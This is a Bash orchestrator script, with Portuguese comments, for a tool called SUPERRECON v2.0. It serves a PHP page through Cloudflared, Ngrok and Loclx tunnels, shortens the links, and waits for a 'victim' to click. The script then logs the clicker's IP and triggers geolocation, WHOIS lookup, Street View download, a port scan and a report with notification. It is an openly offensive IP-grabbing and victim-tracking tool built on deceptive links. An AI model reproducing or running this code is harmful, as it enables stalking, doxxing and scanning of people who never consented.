#!/bin/bash
# super_recon.sh - Orquestrador principal do SUPERRECON v2.0
# 80% Shell, 20% PHP (apenas index.php)

# Carrega configurações
source config.env 2>/dev/null || {
    echo "Arquivo config.env não encontrado! Copie o modelo."
    exit 1
}

# Garante que jq está no PATH (Windows via winget)
if ! command -v jq &>/dev/null; then
    _jq_dir="$(cd "$(dirname "$APPDATA")/Local/Microsoft/WinGet/Packages/jqlang.jq_Microsoft.Winget.Source_8wekyb3d8bbwe" 2>/dev/null && pwd)"
    [ -n "$_jq_dir" ] && export PATH="$PATH:$_jq_dir"
fi

# Carrega os módulos lib/
source lib/core.sh
source lib/geo.sh
source lib/ports.sh
source lib/weather.sh
source lib/whois.sh
source lib/streetview.sh
source lib/report.sh
source lib/tunnels.sh
source lib/notify.sh

# ========== HELP ==========
mostrar_help() {
    cat <<EOF
SUPERRECON v2.0 - Engrenagem de Reconhecimento OSINT

Uso:
  ./super_recon.sh                # Modo Link (sobe servidor + túneis)
  ./super_recon.sh -s <IP>        # Modo Scan manual (analisa um IP)
  ./super_recon.sh -h             # Mostra esta ajuda

Modo Link:
  - Gera links com 3 túneis simultâneos (Cloudflared, Ngrok, Loclx)
  - Encurta URLs automaticamente (TinyURL + is.gd)
  - Aguarda vítima clicar e dispara o scan completo

Modo Scan:
  - Coleta geolocalização, WHOIS, clima
  - Baixa Street View, gera mapa interativo
  - Escaneia portas comuns
  - Gera relatório HTML e envia notificação

Dependências: php, curl, jq, whois, cloudflared, ngrok, loclx
EOF
}

# ========== MODO SERVIDOR (LINK) ==========
modo_servidor() {
    log_info "Modo Link ativado."
    local port=${PHP_PORT:-8080}
    local redirect=${REDIRECT_URL:-"https://www.google.com"}

    # Limpa capturas anteriores para evitar re-scan
    rm -f captures/last_ip.txt

    if ! command -v php &> /dev/null; then
        log_error "PHP nao encontrado. Instale: apt install php"
        exit 1
    fi

    log_info "Iniciando PHP Server na porta $port..."
    REDIRECT_URL="$redirect" php -S 0.0.0.0:"$port" -t . &> php.log &
    local php_pid=$!
    sleep 2
    log_success "PHP Server rodando (PID $php_pid)"

    start_all_tunnels "$port"

    log_info "Aguardando vitimas... (Pressione Ctrl+C para sair)"
    local last_ip=""
    while true; do
        if [ -f "captures/last_ip.txt" ]; then
            local new_ip=$(cat captures/last_ip.txt)
            if [ "$new_ip" != "$last_ip" ] && [ -n "$new_ip" ]; then
                log_success "Nova captura: IP $new_ip"
                processar_ip "$new_ip" &
                last_ip="$new_ip"
            fi
        fi
        sleep 2
    done

    cleanup_tunnels
    _win_kill "$php_pid"
    log_info "Servidor encerrado."
}

trap 'cleanup_tunnels; kill $(jobs -p) 2>/dev/null; exit' INT

# ========== PARSER DE ARGUMENTOS ==========
# So executa se for chamado diretamente (nao quando source'd)
if [ "${BASH_SOURCE[0]}" = "${0}" ]; then
case "$1" in
    -s|--scan)
        if [ -z "$2" ]; then
            log_error "IP não fornecido. Use: $0 -s <IP>"
            exit 1
        fi
        processar_ip "$2"
        ;;
    -h|--help)
        mostrar_help
        ;;
    *)
        modo_servidor
        ;;
esac
fi
